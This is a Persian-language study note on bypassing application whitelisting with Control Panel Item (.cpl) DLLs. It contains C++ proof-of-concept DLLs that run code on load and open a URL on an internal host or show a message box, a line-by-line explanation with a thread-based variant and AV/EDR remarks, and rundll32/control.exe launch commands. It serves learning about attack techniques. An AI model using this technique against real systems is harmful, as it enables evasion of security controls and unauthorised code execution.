
[[Control Panel Item]]

در مبحث Bypass کردن مکانیزم های امنیتی ماننده applocker و موارد این چنینی ما تکینک هایی داشتیم که از اون طریق میومیدم این مکانیزم هارو بایپس میکردیم از طریق باینری های خوده ویندوز 

این تکینک هم مشابه تکنیک قبلی یعنی Control Panel Item هست و به این معنیست که بیایم و یک PE DLL بنویسم که این DLL تابع Export شده CplApplet رو داشته باشه تا DLL ما توسط Control Panel شناسایی شود و Payload که درونش قرار دادیم به نوعی اجرا شود 

فایل های با پسوند تا .cpl یا همون Control Panel Item فایل هایی هستند که برای نمایش ایکون های Control Panel استفاده میشود یا فایل ها در اصل یک DLL هستند و دارند از طریق توابعی ماننده CplApplet مقادیری رو که میخوان اجرا میکنن

نکته : موردی که وجود دارد و میتونه این تابع رو خطرناک کنه اینه که CplApplet تابعی است که ما از طریق این تابع میتونیم بیایم و shell code اجرا کنیم یا فایل از اینترنت دانلود کنیم و موارد دیگر 


```C++
#include <Windows.h>
#include <shellapi.h>
extern "C" __declspec(dllexport) LONG CplApplet(
    HWND hwndCpl,
    UINT msg,
    LPARAM lParam1,
    LPARAM lParam2
)
{
    ShellExecuteA(NULL, "open", "http://172.25.156.100/file/charon.html", NULL, NULL, SW_SHOWNORMAL);

    return 1;
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        CplApplet(NULL, 0, 0, 0);
    }
    return TRUE;
}
```

این payload هستش که به زبان ++C نوشته شده است که کاری که برای ما انجام میدهد این است که میاد برای ما یک url رو باز میکند اما ما داخل این کد از توابعی ماننده cplapplet رو اومدیم استفاده کردیم  و فرمت dll رو به cpl تغییر دادیم تا موقع اجرا توسط control.exe یا rundll32.exe اجرا شود 

---

### توضیح خط‌به‌خط (خلاصهٔ کلی)

کد یک DLL با اکسترنی که شبیه **CPL (Control Panel applet)** رفتار می‌کنه می‌سازد. هنگام بارگذاری DLL، تابع `DllMain` اجرا می‌شود و داخلش صدا زده شده `CplApplet` که با `ShellExecuteA` یک آدرس وب (`http://172.25.156.100/file/charon.html`) را باز می‌کند — یعنی مرورگر پیش‌فرض را باز و آن URL را نمایش می‌دهد.

الآن دقیق‌تر، خط به خط:

```c
#include <Windows.h>
#include <shellapi.h>
```

- هدرهای ویندوز: `Windows.h` شامل انواع و توابع پایهٔ WinAPI است.
    
- `shellapi.h` برای توابع شل مانند `ShellExecuteA` لازم است.
    

```c
extern "C" __declspec(dllexport) LONG CplApplet(
    HWND hwndCpl,
    UINT msg,
    LPARAM lParam1,
    LPARAM lParam2
)
{
    ShellExecuteA(NULL, "open", "http://172.25.156.100/file/charon.html", NULL, NULL, SW_SHOWNORMAL);
    return 1;
}
```

- `extern "C"`: از مِنگلینگ نام C++ جلوگیری می‌کند تا نام تابع قابل export و قابل فراخوانی از خارج (مثل control panel) باشد.
    
- `__declspec(dllexport)`: علامت می‌دهد که این تابع از DLL صادر (export) شود تا برنامه‌های دیگر (یا خود ویندوز) بتوانند آن را صدا بزنند.
    
- نام `CplApplet` و امضای پارامترها: این شِکلِ مرسومِ توابع کنترل‌پنل (.cpl) است — وقتی ویندوز یا `control.exe` یا `rundll32` بخواهد پلاگین کنترل‌پنل را صدا بزند، این تابع را فراخوانی می‌کند. (پارامترها: `hwndCpl` پنجرهٔ صاحب، `msg` پیام CPL مثل `CPL_INIT`, `CPL_EXIT`, `CPL_DBLCLK` و غیره، و `lParam1/2` پارامترهای تکمیلی.)
    
- داخل تابع: `ShellExecuteA(NULL, "open", "http://172.25.156.100/file/charon.html", NULL, NULL, SW_SHOWNORMAL);`
    
    - `ShellExecuteA` مرورگر/برنامهٔ مرتبط با پروتکل `http` را فراخوانی و URL را باز می‌کند.
        
    - پارامترها به ترتیب: (hWnd parent = NULL), operation = `"open"`, file/URL = `"http://..."`, params = `NULL`, directory = `NULL`, showcmd = `SW_SHOWNORMAL`.
        
- `return 1;` — این تابع ۱ برمی‌گرداند (معمولاً برای CPL ممکنه مقدار خروجی بسته به پیام‌ها معنی داشته باشه؛ اینجا همیشه ۱ برگشت داده می‌شود).
    

```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        CplApplet(NULL, 0, 0, 0);
    }
    return TRUE;
}
```

- `DllMain` هَندل بارگذاری/خروج DLL است. `ul_reason_for_call` مقدارش می‌تواند `DLL_PROCESS_ATTACH`, `DLL_PROCESS_DETACH`, `DLL_THREAD_ATTACH`, `DLL_THREAD_DETACH` باشد.
    
- وقتی DLL برای یک فرآیند attach می‌شود (`DLL_PROCESS_ATTACH`)، تابع `CplApplet(NULL,0,0,0)` فراخوانی می‌شود (یعنی بلافاصله URL باز می‌شود).
    
- `return TRUE;` یعنی بارگذاری موفقیت‌آمیز.
    

---

### نتیجهٔ عملی — چه اتفاقی می‌افتد وقتی این DLL لود شود؟

- به محض بارگذاری DLL (مثلاً وقتی ویندوز یا یک برنامه DLL را لود کند) تابع `DllMain` -> `CplApplet` اجرا شده و مرورگر باز می‌شود و URL داده شده لود می‌شود.
    
- این رفتار باعث می‌شود DLL به محض Load «یک عمل جانبی» انجام دهد (اینجا باز کردن URL).
    

---

### نکات فنی و هشدارهای مهم

1. **خطر و رفتار غیرمنتظره در `DllMain`**
    
    - اجرای توابع پیچیده یا فراخوانی APIهایی مثل `ShellExecute` داخل `DllMain` **خطرناک** است و می‌تواند باعث deadlock یا کرش شود. در `DllMain` نباید منتظر منابعی مثل loader lock باشید یا توابعی را صدا بزنید که خودشان ممکن است loader lock بگیرند.
        
    - اگر کاری باید در بارگذاری انجام شود، بهتر است یک ترد جدید بسازید (`CreateThread`) و کار را در آن ترد انجام دهید (البته حتی `CreateThread` در DllMain هم حساس است، اما معمولاً برای offloading ساده پذیرفته‌تر است — اما بهترین روش این است که کاری در DllMain انجام نشود و از یک مکان امن‌تر (مثلاً تابع exported جدا) استفاده شود).
        
2. **این تکنیک شبیه روش‌های اجرایی/persistence مخرب است**
    
    - DLLهایی که در لحظهٔ لود کارهایی مثل دانلود/اجرای URL انجام می‌دهند معمولاً توسط بدافزارها یا ابزارهای بارگذار به کار می‌روند. اگر قصدت آموزشی است مشکلی نیست ولی در استفادهٔ واقعی مراقب باش — روی ماشین‌های هدف یا بدون مجوز استفاده نشه.
        
3. **عدم بررسی ارور**
    
    - `ShellExecuteA` مقدار برگشتی دارد که باید بررسی شود (در صورت failure مقدار <= 32 برمی‌گرداند). بهتره نتیجه بررسی شود تا بفهمی عملیات موفق بوده یا نه.
        
4. **A/V و EDR**
    
    - رفتار «باز کردن URL هنگام لود DLL» ممکن است توسط آنتی‌ویروس‌ها یا EDRها علامت‌گذاری شود. اگر دنبال تست هستی، روی محیط آزمایشگاهی (VM ایزوله) انجام بده.
        
5. **آدرس شبکهٔ تو محلیه**
    
    - آدرس `172.25.156.100` یک آدرس خصوصی/داخلی است — یعنی URL در شبکهٔ لوکال/شرکتی. مطمئن شو سرور هدف واقعاً امنه.
        

---

### پیشنهاد اصلاح (ایمن‌تر و قابل تست)

اگر منظورت اجرای URL هنگام بارگذاری است ولی می‌خواهی از مشکلات `DllMain` جلوگیری کنی، بهتر اینه یک ترد ایجاد کنی که بعد از attach کار را انجام دهد (نکته: حتی ایجاد ترد داخل DllMain بحث‌برانگیزه اما معمولاً عملی‌تر از فراخوانی ShellExecute مستقیم است). مثلاً:

```c
#include <Windows.h>
#include <shellapi.h>

DWORD WINAPI OpenUrlThread(LPVOID lpParam)
{
    ShellExecuteA(NULL, "open", "http://172.25.156.100/file/charon.html", NULL, NULL, SW_SHOWNORMAL);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    HANDLE hThread;
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        // CreateThread در DllMain هم با احتیاطه، اما بهتر از اجرای مستقیم ShellExecute توی DllMain هست.
        hThread = CreateThread(NULL, 0, OpenUrlThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
```

نکات:

- بررسی ارور `ShellExecuteA` و `CreateThread` رو اضافه کن.
    
- اگر می‌خوای کاملاً روبراه باشی، راه‌اندازی پس‌زمینه را خارج از DllMain انجام بده (مثلاً از تابع export شده که caller خودش صدا بزنه).
    

---

### چطور آزمایش کنی (در محیط آزمایشی)

- DLL را بساز (link به shell32.lib شاید لازم باشه).
    
- نام فایل را به `.cpl` تغییر بده (مثلاً `mytest.cpl`) و آن را در دسکتاپ یا `%windir%\System32\` قرار بده (برای تست محلی).
    
- روی ویندوز: می‌تونی با `control.exe mytest.cpl` یا با `rundll32.exe mytest.cpl,CplApplet` یا فقط دوبار کلیک روی فایل .cpl امتحان کنی.
    
- توجه: برای آزمایش‌ها از ماشین مجازی ایزوله استفاده کن.
    

---

### خلاصهٔ کوتاه و عملی

- کد: به محض لود شدن DLL، مرورگر باز و URL `http://172.25.156.100/file/charon.html` را باز می‌کند.
    
- مشکل فنی: فراخوانی `ShellExecuteA` داخل `DllMain` ناپایدار/غیرایمن است.
    
- پیشنهاد: عملیات‌های I/O یا شبکه را بیرون از `DllMain` انجام بده (ترد مناسب یا تابع export جدا) و خطاها را چک کن. همچنین مراقب مسائل امنیتی و تشخیص آنتی‌ویروس باش.
    

---

![[Pasted image 20251112054414.png]]

![[cplexecution.gif]]

![[image.avif]]

![[image/image 1.png]]

```
#include <Windows.h>

//Cplapplet
extern "C" __declspec(dllexport) LONG Cplapplet(
	HWND hwndCpl,
	UINT msg,
	LPARAM lParam1,
	LPARAM lParam2
)
{
	MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
	return 1;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	{
		Cplapplet(NULL, NULL, NULL, NULL);
	}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```


```
rundll32 shell32, Control_RunDLL \\VBOXSVR\Experiments\cpldoubleclick
\cpldoubleclick\Debug\cpldoubleclick.cpl
```
